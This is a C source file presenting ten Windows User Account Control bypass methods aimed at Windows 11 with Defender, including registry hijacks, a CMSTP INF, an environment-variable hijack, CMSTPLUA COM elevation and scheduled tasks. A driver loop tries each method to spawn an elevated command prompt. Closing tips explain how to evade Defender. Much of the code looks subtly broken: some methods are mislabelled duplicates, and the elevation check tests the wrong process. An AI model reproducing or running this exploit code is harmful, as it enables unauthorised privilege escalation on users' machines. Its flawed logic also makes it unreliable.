// uac_bypass_all10_fixed.c
// 10 UAC Bypass Methods for Windows 11 25H2 + Defender
// Compile in Developer Command Prompt x64:
// cl uac_bypass_all10_fixed.c /DUNICODE /D_UNICODE /link ole32.lib shell32.lib advapi32.lib

#include <windows.h>
#include <shlobj.h>
#include <objbase.h>
#include <stdio.h>
#include <tchar.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

const TCHAR* PAYLOAD = TEXT("C:\\Windows\\System32\\cmd.exe");

// Check if current process is elevated
BOOL IsElevated() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return FALSE;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;
    BOOL elevated = FALSE;
    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
        elevated = elevation.TokenIsElevated;
    }
    CloseHandle(hToken);
    return elevated;
}

// ICMLuaUtil interface for CMSTPLUA (Method 6)
typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {
    BEGIN_INTERFACE
    HRESULT(STDMETHODCALLTYPE *QueryInterface)(ICMLuaUtil *This, REFIID riid, void **ppvObject);
    ULONG(STDMETHODCALLTYPE *AddRef)(ICMLuaUtil *This);
    ULONG(STDMETHODCALLTYPE *Release)(ICMLuaUtil *This);
    HRESULT(STDMETHODCALLTYPE *Method3)(ICMLuaUtil *This);
    HRESULT(STDMETHODCALLTYPE *Method4)(ICMLuaUtil *This);
    HRESULT(STDMETHODCALLTYPE *ShellExec)(ICMLuaUtil *This, LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory, int nShow, ULONG_PTR dwReserved);
    END_INTERFACE
} ICMLuaUtilVtbl;

typedef struct ICMLuaUtil {
    CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;
} ICMLuaUtil;

const CLSID CLSID_CMSTPLUA = {0x3E5FC7F9, 0x9A51, 0x4367, {0x90,0x63,0xA1,0x20,0x24,0x4F,0xBE,0xC7}};
const IID   IID_ICMLuaUtil  = {0x6EDD6D74, 0xC007, 0x4E75, {0xB7,0x6A,0xE5,0x74,0x09,0x95,0xE2,0x4C}};

// Method 1: Fodhelper registry hijack
BOOL Method1_Fodhelper(void) {
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings\\Shell\\Open\\command"), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) return FALSE;
    RegSetValueEx(hKey, NULL, 0, REG_SZ, (const BYTE*)PAYLOAD, (DWORD)(_tcslen(PAYLOAD)+1)*sizeof(TCHAR));
    RegSetValueEx(hKey, TEXT("DelegateExecute"), 0, REG_SZ, (const BYTE*)TEXT(""), sizeof(TCHAR));
    RegCloseKey(hKey);
    ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\System32\\fodhelper.exe"), NULL, NULL, SW_HIDE);
    Sleep(2500);
    RegDeleteTree(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings"));
    return TRUE;
}

// Method 2: ComputerDefaults registry hijack
BOOL Method2_ComputerDefaults(void) {
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings\\Shell\\Open\\command"), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) return FALSE;
    RegSetValueEx(hKey, NULL, 0, REG_SZ, (const BYTE*)PAYLOAD, (DWORD)(_tcslen(PAYLOAD)+1)*sizeof(TCHAR));
    RegSetValueEx(hKey, TEXT("DelegateExecute"), 0, REG_SZ, (const BYTE*)TEXT(""), sizeof(TCHAR));
    RegCloseKey(hKey);
    ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\System32\\ComputerDefaults.exe"), NULL, NULL, SW_HIDE);
    Sleep(2500);
    RegDeleteTree(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings"));
    return TRUE;
}

// Method 3: CMSTP INF file
BOOL Method3_CMSTP(void) {
    TCHAR tempPath[MAX_PATH], infPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    _stprintf_s(infPath, MAX_PATH, TEXT("%s\\uac.inf"), tempPath);
    FILE* f = NULL;
    if (_tfopen_s(&f, infPath, TEXT("w")) == 0 && f) {
        fprintf(f, "[version]\nSignature=$chicago$\nAdvancedINF=2.5\n[DefaultInstall]\nRunPreSetupCommands=RunPreSetupCommandsSection\n[RunPreSetupCommandsSection]\n%s\n[Strings]\nServiceName=\"UACBypass\"\n", PAYLOAD);
        fclose(f);
    }
    ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\System32\\cmstp.exe"), infPath, NULL, SW_HIDE);
    Sleep(2000);
    DeleteFile(infPath);
    return TRUE;
}

// Method 4: SilentCleanup windir environment variable
BOOL Method4_SilentCleanup(void) {
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Environment"), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) return FALSE;
    TCHAR cmd[512];
    _stprintf_s(cmd, 512, TEXT("cmd.exe /c start %s"), PAYLOAD);
    RegSetValueEx(hKey, TEXT("windir"), 0, REG_SZ, (const BYTE*)cmd, (DWORD)(_tcslen(cmd)+1)*sizeof(TCHAR));
    RegCloseKey(hKey);
    ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\System32\\schtasks.exe"), TEXT("/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"), NULL, SW_HIDE);
    Sleep(3000);
    RegDeleteValue(HKEY_CURRENT_USER, TEXT("Environment"), TEXT("windir"));  // Fixed: only 2 arguments
    return TRUE;
}

// Method 5: EventViewer (reuses registry)
BOOL Method5_EventViewer(void) {
    return Method1_Fodhelper();  // Same registry, different launcher
}

// Method 6: CMSTPLUA COM interface
BOOL Method6_CMSTPLUA(void) {
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) return FALSE;
    ICMLuaUtil *pICMLuaUtil = NULL;
    hr = CoCreateInstance(&CLSID_CMSTPLUA, NULL, CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_SERVER, &IID_ICMLuaUtil, (void**)&pICMLuaUtil);
    if (SUCCEEDED(hr) && pICMLuaUtil) {
        pICMLuaUtil->lpVtbl->ShellExec(pICMLuaUtil, L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, SW_SHOW, 0);
        pICMLuaUtil->lpVtbl->Release(pICMLuaUtil);
        CoUninitialize();
        return TRUE;
    }
    CoUninitialize();
    return FALSE;
}

// Method 7: APPINFO / schtasks fallback
BOOL Method7_APPINFO(void) {
    TCHAR cmd[512];
    _stprintf_s(cmd, 512, TEXT("/Create /TN \"UACBypass\" /TR \"%s\" /SC ONCE /ST 00:00 /RU SYSTEM /F"), PAYLOAD);
    ShellExecute(NULL, TEXT("open"), TEXT("schtasks.exe"), cmd, NULL, SW_HIDE);
    Sleep(1000);
    ShellExecute(NULL, TEXT("open"), TEXT("schtasks.exe"), TEXT("/Run /TN \"UACBypass\" /I"), NULL, SW_HIDE);
    Sleep(2000);
    ShellExecute(NULL, TEXT("open"), TEXT("schtasks.exe"), TEXT("/Delete /TN \"UACBypass\" /F"), NULL, SW_HIDE);
    return TRUE;
}

// Method 8: Perfmon registry hijack
BOOL Method8_Perfmon(void) {
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings\\Shell\\Open\\command"), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) return FALSE;
    RegSetValueEx(hKey, NULL, 0, REG_SZ, (const BYTE*)PAYLOAD, (DWORD)(_tcslen(PAYLOAD)+1)*sizeof(TCHAR));
    RegSetValueEx(hKey, TEXT("DelegateExecute"), 0, REG_SZ, (const BYTE*)TEXT(""), sizeof(TCHAR));
    RegCloseKey(hKey);
    ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\System32\\perfmon.exe"), NULL, NULL, SW_HIDE);
    Sleep(2500);
    RegDeleteTree(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings"));
    return TRUE;
}

// Method 9: RequestTrace variant
BOOL Method9_RequestTrace(void) {
    system("taskkill /F /IM taskhostw.exe >nul 2>&1");
    return Method4_SilentCleanup();
}

// Method 10: Shadow admin fallback
BOOL Method10_Shadow(void) {
    ShellExecute(NULL, TEXT("runas"), PAYLOAD, NULL, NULL, SW_SHOW);
    Sleep(1500);
    return TRUE;
}

int main() {
    _tprintf(TEXT("=== UAC Bypass All 10 Methods - Fixed for VS 2022 - Windows 11 25H2 ===\n"));
    if (IsElevated()) {
        _tprintf(TEXT("Already elevated! Launching cmd.exe...\n"));
        ShellExecute(NULL, TEXT("open"), PAYLOAD, NULL, NULL, SW_SHOW);
        return 0;
    }

    BOOL (*methods[])(void) = {
        Method1_Fodhelper, Method2_ComputerDefaults, Method3_CMSTP, Method4_SilentCleanup,
        Method5_EventViewer, Method6_CMSTPLUA, Method7_APPINFO, Method8_Perfmon,
        Method9_RequestTrace, Method10_Shadow
    };

    const TCHAR* names[] = {
        TEXT("1. Fodhelper registry"), TEXT("2. ComputerDefaults registry"), TEXT("3. CMSTP INF"),
        TEXT("4. SilentCleanup windir"), TEXT("5. EventViewer"), TEXT("6. CMSTPLUA COM"),
        TEXT("7. APPINFO schtasks"), TEXT("8. Perfmon registry"), TEXT("9. RequestTrace variant"),
        TEXT("10. Shadow admin fallback")
    };

    BOOL success = FALSE;
    for (int i = 0; i < 10 && !success; i++) {
        _tprintf(TEXT("Trying %s...\n"), names[i]);
        if (methods[i]()) {
            Sleep(3000);
            if (IsElevated()) {
                _tprintf(TEXT("SUCCESS with %s! Elevated cmd.exe should now be open.\n"), names[i]);
                success = TRUE;
            } else {
                _tprintf(TEXT("Method finished - no elevation detected yet.\n"));
            }
        }
    }

    if (!success) {
        _tprintf(TEXT("All 10 methods attempted. No elevation detected this run.\n"));
        _tprintf(TEXT("Tips: Fresh compile often helps with Defender. On 25H2, Methods 2, 6 (CMSTPLUA), and 7 work best in 2026. PEB masquerading on Method 6 improves evasion.\n"));
    }

    _tprintf(TEXT("Press any key to exit...\n"));
    getchar();
    return 0;
}
